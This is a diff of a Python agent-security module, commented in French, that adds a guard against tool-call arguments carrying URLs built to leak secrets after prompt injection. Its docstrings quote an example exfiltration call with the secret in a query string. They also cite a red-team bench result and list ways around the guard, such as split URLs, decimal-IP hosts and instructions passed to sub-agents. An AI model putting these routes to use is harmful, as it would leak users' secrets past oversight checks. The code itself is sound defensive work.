@@ -48,7 +48,8 @@ from urllib.parse import urlsplit
 
 from .schema import TAINT_SENTINEL, UNTRUSTED_OPEN, Message
 
-__all__ = ["OutputFinding", "OutputGuard", "guard_output", "resolve_output_guard", "split_transcript"]
+__all__ = ["OutputFinding", "OutputGuard", "guard_call_urls", "guard_output", "resolve_output_guard",
+           "resolve_url_guard", "split_transcript"]
 
 IMAGE_RETIREE = "[image retirée]"
 LIEN_RETIRE = "[lien retiré]"
@@ -120,7 +121,7 @@ class OutputGuard:
 class OutputFinding:
     """Une URL retirée. JAMAIS l'URL elle-même (elle peut porter le secret) : genre, longueur, empreinte."""
 
-    kind: str          # "image" | "link" | "reference" | "html" | "bare"
+    kind: str          # "image" | "link" | "reference" | "html" | "bare" | "call" (argument d'un appel d'outil)
     length: int
     digest: str
 
@@ -140,17 +141,21 @@ def resolve_output_guard(valeur: object) -> OutputGuard | None:
     raise ValueError(f"output_guard : « off », « neutralize » ou un OutputGuard, pas {valeur!r}")
 
 
-def split_transcript(messages: Sequence[Message]) -> tuple[str, str]:
+def split_transcript(messages: Sequence[Message], *, request_trusted: bool = True) -> tuple[str, str]:
     """(contenu FIABLE, contenu NON FIABLE) du transcript. Fiable : prompt système, utilisateur, résultats d'outils non
     encadrés. Non fiable : résultats d'outils encadrés (`UNTRUSTED_OPEN`). Les messages de l'assistant ne comptent dans
     aucun des deux (le modèle ne se cite pas lui-même), ni un résumé de mémoire teinté (le contenu d'origine a disparu :
-    ce qu'il cite n'est plus vérifiable, donc refusé)."""
+    ce qu'il cite n'est plus vérifiable, donc refusé). `request_trusted=False` : les messages « user » ne sont PAS une
+    source fiable — le cas d'un sous-agent appelé par un run teinté, dont la demande a été écrite par un modèle qui
+    avait lu du contenu non fiable."""
     fiable: list[str] = []
     non_fiable: list[str] = []
     for m in messages:
         contenu = m.content or ""
         if m.role == "tool":
             (non_fiable if UNTRUSTED_OPEN in contenu else fiable).append(contenu)
+        elif m.role == "user" and not request_trusted:
+            continue
         elif m.role in ("system", "user") and TAINT_SENTINEL not in contenu:
             fiable.append(contenu)
     return "\n".join(fiable), "\n".join(non_fiable)
@@ -371,3 +376,150 @@ def guard_output(
     fiable, non_fiable = split_transcript(list(messages))
     passe = _Passe(politique or OutputGuard(), fiable, non_fiable)
     return _nettoyer(texte, passe), passe.trouvailles
+
+
+# ── La même règle, pour les ARGUMENTS d'un appel d'outil (0.26.0) ────────────
+
+# Un argument ENTIER de la forme `hôte.tld/chemin` ou `hôte.tld?requête`, sans schéma : un outil de lecture ajoute
+# souvent le schéma lui-même. Exige un point dans l'hôte et un `/`, `?` ou `#` ensuite : `rapport.csv` et
+# `src/app.py` n'en sont pas.
+_FIN_HOTE = re.compile(r"[/?#]")
+_HOTE_SEUL = re.compile(r"[a-z0-9][a-z0-9\-._~%]*", re.I)
+
+
+def _hote_nu(texte: str) -> bool:
+    """`hôte.tld/…`, `hôte.tld?…`, `hôte.tld:8080/…` — sans schéma, sans blanc. Écrit à la main, en temps LINÉAIRE :
+    l'expression régulière équivalente (`[a-z0-9.]*\\.[a-z0-9.]+…`) était quadratique sur `a.a.a.a…` (0,16 s pour
+    4 000 caractères) — un argument d'appel suffisait à bloquer le run."""
+    fin = _FIN_HOTE.search(texte)
+    if fin is None or any(c.isspace() for c in texte):
+        return False
+    hote, deux_points, port = texte[:fin.start()].partition(":")
+    if deux_points and not port.isdigit():
+        return False
+    return bool(_HOTE_SEUL.fullmatch(hote)) and "." in hote[:-1]
+# Le début d'une URL dans un ARGUMENT. Plus strict que `_NUE` sur deux points : un schéma d'au moins deux lettres
+# suivi de deux barres (un chemin Windows `c:` + deux barres inverses n'est pas une URL), et les schémas du web avec
+# UNE seule barre, oblique ou inverse (`https:/hôte` : un navigateur et certains clients HTTP les acceptent).
+_TETE_URL = (r"(?:[a-z][a-z0-9+.\-]+:[\\/]{2}|(?:https?|ftp|wss?):[\\/]"
+             r"|[\\/]{2,}(?=[a-z0-9\-]+(?:\.[a-z0-9\-]+|:\d))|www\.[a-z0-9\-]+\.[a-z])")
+_DEBUT_URL = re.compile("^" + _TETE_URL, re.I)
+# La même tête, cherchée DANS un texte libre ; ne démarre qu'au début d'une suite de caractères (temps linéaire).
+_URL_DANS_TEXTE = re.compile(r"(?<![\w+.\-:/\\])" + _TETE_URL + r"[^\s<>\"'`]*", re.I)
+
+
+def _est_url_d_appel(texte: str) -> bool:
+    return bool(_DEBUT_URL.match(texte)) or _hote_nu(texte)
+
+
+def _hote_autorise(url: str, politique: OutputGuard) -> bool:
+    """L'hôte d'une URL d'appel est-il dans `allowed_hosts` ? Refuse toute forme que deux analyseurs liraient
+    différemment : une barre inverse, des identifiants (`user@`), un hôte illisible."""
+    if not politique.allowed_hosts or "\\" in url:
+        return False
+    complete = url if _SCHEMA.match(url) else ("https:" + url if url.startswith("//") else "https://" + url)
+    try:
+        parties = urlsplit(complete)
+        hote = (parties.hostname or "").lower()
+        identifiants = parties.username is not None or parties.password is not None
+    except ValueError:
+        return False
+    return bool(hote) and not identifiants and any(hote == h or hote.endswith("." + h) for h in politique.allowed_hosts)
+
+
+def _url_d_appel_permise(url: str, politique: OutputGuard, fiable: str, non_fiable: str, *, dans_un_texte: bool) -> bool:
+    """La règle pour UNE URL d'argument : EXACTE, sans aucune des équivalences de la réponse.
+
+    Dans une réponse, `&amp;`, la casse de l'hôte ou un `/` final sont du bruit de rendu. Dans un appel, ce que
+    l'outil reçoit part tel quel : tout ce qu'une comparaison « tolérante » ignorerait (des tabulations au milieu
+    d'une URL citée, des caractères écrits en entités, la casse) est un canal où coder le secret vers l'hôte de la
+    page. Donc : aucun blanc ni caractère de contrôle, et l'URL doit se lire MOT POUR MOT dans la conversation."""
+    if not url or any(c.isspace() or ord(c) < 0x20 or ord(c) == 0x7F for c in url):
+        return False
+    variantes = [url]
+    if dans_un_texte:                                 # la ponctuation de la phrase qui suit l'URL
+        courte = url
+        while courte and courte[-1] in _PONCT_FINALE and len(variantes) <= 8:
+            courte = courte[:-1]
+            variantes.append(courte)
+    for v in variantes:
+        if not _est_url_d_appel(v):
+            continue
+        if v in fiable or (politique.links_from_untrusted and v in non_fiable):
+            return True
+    return _hote_autorise(variantes[-1] if _est_url_d_appel(variantes[-1]) else url, politique)
+
+
+def _chaines(valeur: object, profondeur: int = 0) -> Iterable[str]:
+    """Toutes les chaînes d'une valeur JSON (clés comprises), à profondeur bornée."""
+    if isinstance(valeur, str):
+        yield valeur
+    elif profondeur < 12:
+        if isinstance(valeur, dict):
+            for cle, v in valeur.items():
+                yield from _chaines(cle, profondeur + 1)
+                yield from _chaines(v, profondeur + 1)
+        elif isinstance(valeur, (list, tuple)):
+            for v in valeur:
+                yield from _chaines(v, profondeur + 1)
+
+
+def guard_call_urls(
+    arguments: object, messages: Iterable[Message], politique: OutputGuard | None = None, *,
+    request_trusted: bool = True,
+) -> list[OutputFinding]:
+    """Les URL des ARGUMENTS d'un appel d'outil que la règle refuse (`Agent(url_guard="deny")`, 0.26.0).
+
+    Lire une URL, c'est aussi écrire : `lire_page("https://hôte/p.png?d=SECRET")` exfiltre comme un envoi, et un outil
+    de lecture n'est pas `egress` — le banc des routes (`redteam.run_route_bench`) trouvait cette route ouverte sous
+    toutes les gardes. La règle est celle de la réponse, pour un LIEN : dans un run teinté, une URL passée à un outil
+    doit figurer dans la conversation — contenu fiable, hôte de `allowed_hosts`, ou (sauf `links_from_untrusted=False`)
+    citée par le contenu non fiable. Une URL CONSTRUITE (le secret collé dans la requête, le chemin ou l'hôte) n'y
+    figure jamais.
+
+    Sont lues : toutes les chaînes des arguments (imbriquées, clés comprises). Un argument qui COMMENCE par une URL
+    (schéma, `//hôte`, `www.`, ou `hôte.tld/…` sans schéma) est jugé EN ENTIER et TEL QUEL : ce qui suit un espace, un
+    guillemet ou un `#` part avec la requête. Dans un texte libre, chaque URL trouvée est jugée. La comparaison est
+    EXACTE — aucune des équivalences de la réponse (`&amp;`, casse de l'hôte, `/` final, http/https) : dans un appel,
+    chaque tolérance est un canal où coder le secret. Une URL d'argument ne porte ni blanc ni caractère de contrôle.
+    Une liste vide = rien à refuser.
+
+    Ce que ça ne voit PAS, écrit : une URL passée en morceaux (`host=` et `path=` séparés) ; une requête de recherche
+    en texte libre ; un identifiant que l'outil transforme lui-même en URL ; un hôte sans point ni schéma
+    (`serveur/chemin`, une adresse IP écrite en entier décimal) ; une consigne en texte libre à un sous-agent
+    (« ajoute le code à la fin de l'URL ») — pose la garde sur l'agent qui détient l'outil de lecture, ou fais-la
+    hériter (`inherit_policy=True`). Un outil de lecture devrait exiger un schéma. Pure, sans effet de bord."""
+    candidats: list[tuple[str, bool]] = []            # (URL, trouvée dans un texte libre ?)
+    for chaine in _chaines(arguments):
+        if _est_url_d_appel(chaine.strip(_BORDS)):
+            # L'argument EST une URL : c'est lui, EN ENTIER et tel quel, que l'outil recevra. Le juger sur la seule
+            # partie « qui ressemble à une URL » laissait passer `<URL citée par la page> <secret>` (un client HTTP
+            # encode l'espace et envoie le tout). Plusieurs URL séparées par UN espace ou une virgule sont jugées une
+            # à une, à condition que CHAQUE morceau soit une URL ; sinon la chaîne entière est jugée — et refusée
+            # dès qu'elle porte un blanc.
+            morceaux = [m for bloc in chaine.split(" ") for m in _COLLEES.split(bloc)]
+            if all(_est_url_d_appel(m) for m in morceaux):
+                candidats.extend((m, False) for m in morceaux)
+            else:
+                candidats.append((chaine, False))
+            continue
+        candidats.extend((morceau, True) for m in _URL_DANS_TEXTE.finditer(chaine)
+                         for morceau in _COLLEES.split(m.group(0)))
+    if not candidats:
+        return []
+    regle = politique or OutputGuard()
+    fiable, non_fiable = split_transcript(list(messages), request_trusted=request_trusted)
+    return [OutputFinding("call", len(url), _empreinte(url)) for url, dans_un_texte in candidats
+            if not _url_d_appel_permise(url, regle, fiable, non_fiable, dans_un_texte=dans_un_texte)]
+
+
+def resolve_url_guard(valeur: object) -> OutputGuard | None:
+    """`"off"`/`None` → pas de garde ; `"deny"` → réglage par défaut ; un `OutputGuard` → ses `allowed_hosts` et
+    `links_from_untrusted`. Autre : erreur (une faute de frappe ne désactive pas la garde en silence)."""
+    if valeur is None or valeur == "off":
+        return None
+    if valeur == "deny":
+        return OutputGuard()
+    if isinstance(valeur, OutputGuard):
+        return valeur
+    raise ValueError(f"url_guard : « off », « deny » ou un OutputGuard, pas {valeur!r}")
